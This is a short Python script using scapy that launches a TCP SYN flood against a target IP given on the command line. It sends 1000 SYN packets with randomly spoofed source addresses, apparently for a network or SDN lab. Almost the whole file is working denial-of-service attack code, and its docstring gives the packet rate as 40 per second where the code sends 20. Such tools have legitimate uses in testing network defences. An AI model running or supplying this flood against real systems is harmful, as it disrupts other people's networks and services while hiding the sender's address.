#run on host's xterm terminal "python -E syn-flood.py victim_ip"
"""
TCP_SYN flooding attack to target host IP address with fake source ip address
This attack might harmful to controller, switch, and even host within the network.
send 1000 packets with the rate of 40 packets per second
"""
#!/usr/bin/env python
import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP, RandShort
from random import randrange

def sourceIPgen():
    # this function generates random IP addresses
    # these values are not valid for first octet of IP address
    not_valid = [10,127,254,255,1,2,169,172,192]
    first = randrange(1, 256)

    while first in not_valid:
        first = randrange(1, 256)
    #print first
    ip = ".".join([str(first), str(randrange(1, 256)), str(randrange(1, 256)), str(randrange(1, 256))])
    #print ip
    return ip
    # send the generated IPs

def main():
    # getting the ip address to send attack packets
    dstIP = sys.argv[1:]
    print dstIP
    # open interface eth0 to send packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print (repr(interface))
    for i in xrange(1000):
        # form the packet
        packets = Ether()/IP(dst=dstIP, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
        # send packet with the defined interval (seconds)
        sendp(packets, iface=interface.rstrip(), inter=0.05)
    # main

if __name__ == "__main__":
    main()
